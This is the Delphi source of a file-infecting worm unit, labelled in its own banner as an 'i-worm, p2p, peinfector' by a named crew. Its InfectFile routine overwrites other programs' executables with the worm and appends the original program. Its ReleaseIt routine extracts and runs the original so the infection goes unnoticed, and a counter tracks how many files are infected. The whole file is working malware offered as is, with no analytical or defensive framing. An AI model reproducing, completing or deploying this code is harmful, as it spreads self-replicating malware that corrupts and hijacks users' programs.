   unit untInfector;

   interface

   uses
     windows, tlhelp32, shellapi, untStatus;

   const
     msgav: String = #13#10#13#10#13#10'i-worm, p2p, peinfector'#13#10'created by [blaZcan]'#13#10'Brought to you by the ShadowCode crew'#13#10#13#10#13#10;

   function UpperCase(const S: string): string;
   function InttoStr(const Value: integer): string;
   function StrtoInt(const S: string): integer;
   function IsRunning(ExeFileName: string): bool;
   function GenerateName: String;
   function ExtractFileName(const Path: string): string;

   procedure ReleaseIt;
   procedure InfectFile(Name: String);
   procedure ReadFileStr(Fname:string;var FullContents:string);

   implementation

   function ExtractFileName(const Path: string): string;
   var
     i, L: integer;
     Ch: Char;
   begin
     L := Length(Path);
     for i := L downto 1 do
     begin
       Ch := Path[i];
       if (Ch = '\') or (Ch = '/') then
       begin
         Result := Copy(Path, i + 1, L - i);
         Break;
       end;
     end;
   end;

   function InttoStr(const Value: integer): string; var S: string[11];
   begin Str(Value, S); Result := S; end;

   function StrtoInt(const S: string): integer; var E: integer;
   begin Val(S, Result, E);end;

   function IsRunning(ExeFileName: string): bool;
   const
     PROCESS_TERMINATE=$0001;
   var
     ContinueLoop: BOOL;
     FSnapshotHandle: THandle;
     FProcessEntry32: TProcessEntry32;
     Len: Integer;
     name1, name2, name3: string;
   begin
     result := False;

     FSnapshotHandle := CreateToolhelp32Snapshot
                        (TH32CS_SNAPPROCESS, 0);
     FProcessEntry32.dwSize := Sizeof(FProcessEntry32);
     ContinueLoop := Process32First(FSnapshotHandle,
                                    FProcessEntry32);

     while integer(ContinueLoop) <> 0 do
     begin
       Len := Length(FProcessEntry32.szExeFile);

       Name1 := UpperCase(ExtractFileName(FProcessEntry32.szExeFile));
       Name2 := UpperCase(Copy(ExeFileName, 1, Len));
       Name3 := UpperCase(FProcessEntry32.szExeFile);

       If (Name1 = Name2) Or (Name3 = Name2) Then
         Result := True;

       ContinueLoop := Process32Next(FSnapshotHandle,
                                     FProcessEntry32);
     end;

     CloseHandle(FSnapshotHandle);
   end;

   Procedure ReleaseIt;
   Var
     FContent, Settings, FName, FSet, PName: String;
     I, FSize: Integer;
     F: TextFile;
   Begin
     PName := GenerateName;
     If Not CopyFile(pChar(ParamStr(0)), pChar(PName), False) Then Exit;
     ReadFileStr(PName, FContent);

     I := Length(FContent);
     Settings := '';

     While (I > 0) And (FContent[i] <> #00) Do
     Begin
       Settings := FContent[i] + Settings;
       Dec(I);
     End;

     If Settings = '' Then
     Begin
       DeleteFile(pChar(PName));
       Exit;
     End;
     Delete(FContent, I, Length(Settings));

     While Pos(#01, Settings) > 0 Do
     Begin
       FSet := Copy(Settings, 1, Pos(#01, Settings)-1);
       Delete(Settings, 1, Pos(#01, Settings));

       FName := Copy(FSet, 1, Pos(#02, FSet)-1);
       Delete(FSet, 1, Pos(#02, FSet));
       FSize := StrToInt(FSet);

       Try
         AssignFile(F, FName);
         ReWrite(F);
         Write(F, Copy(FContent, Length(FContent)-FSize, FSize));
         CloseFile(F);
       Except
         Exit;
       End;

       Delete(FContent, Length(FContent)-FSize, FSize);
       ShellExecute(0, NIL, pChar(FName), NIL, NIL, 1);
     End;
     DeleteFile(pChar(PName));
   End;

   procedure ReadFileStr(Fname:string;var FullContents:string);
   var
    Fcontents:File of Char;
    Fbuffer:array [1..1024] of Char;
    rLen,Fsize:LongInt;
   begin
   Try
    FullContents:='';

    AssignFile(Fcontents,Fname);
    Reset(Fcontents);
    Fsize:=FileSize(Fcontents);
    while not Eof(Fcontents) do begin
     BlockRead(Fcontents,Fbuffer,1024,rLen);
     FullContents:=FullContents + string(Fbuffer);
    end;
    CloseFile(Fcontents);

    if Length(FullContents) > Fsize then
     FullContents:=Copy(FullContents,1,Fsize);
   Except
     ;
   End;
   end;

   Function GenerateName: String;
   Begin
     Randomize;
     Result := '';
     While Length(Result) < 10 do
       Result := Result + IntToStr(Random(10));
     Result := Result+'.exe';
   End;

   Procedure InfectFile(Name: String);
   Var
     FileBuffer, Settings: String;
     F: TextFile;
   Begin
     If IsRunning(ExtractFileName(Name)) Then Exit;
     If Name = ParamStr(0) Then Exit;

     FileBuffer := '';
     ReadFileStr(Name, FileBuffer);
     If FileBuffer = '' Then Exit;

     If Pos('~c~a~n~n~a~b~i~s~~i~s~~n~o~t~~a~~d~r~u~g~', FileBuffer) > 0 Then Exit;
     If Not CopyFile(pChar(ParamStr(0)), pChar(Name), False) Then Exit;

     Settings := #00 + GenerateName + #02 + IntToStr(Length(FileBuffer)) + #01;

     AssignFile(F, Name);
     Append(F);
     Write(F, FileBuffer);
     Write(F, Settings);
     CloseFile(F);

     Inc(SPREAD_FILES_INFECTED);
   End;

   function UpperCase(const S: string): string;
   var
     Ch: Char;
     L: Integer;
     Source, Dest: PChar;
   begin
     L := Length(S);
     SetLength(Result, L);
     Source := Pointer(S);
     Dest := Pointer(Result);
     while L <> 0 do
     begin
       Ch := Source^;
       if (Ch >= 'a') and (Ch <= 'z') then Dec(Ch, 32);
       Dest^ := Ch;
       Inc(Source);
       Inc(Dest);
       Dec(L);
     end;
   end;

   end.
